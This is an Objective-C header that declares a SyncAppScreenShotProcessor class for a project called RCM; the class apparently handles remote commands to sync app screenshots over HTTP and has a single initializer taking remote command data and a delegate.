//
//  SyncAppScreenShotProcessor.h
//  RCM
//
//  Created by ophat on 4/4/16.
//
//

#import <Foundation/Foundation.h>
#import "RemoteCmdAsyncHTTPProcessor.h"
#import "AppScreenShotManager.h"

@interface SyncAppScreenShotProcessor : RemoteCmdAsyncHTTPProcessor <AppScreenShotDelegate> {
    
}


//Initialize Processor with RemoteCommandData and RemoteCmdProcessingDelegate;
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
    andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate;

@end
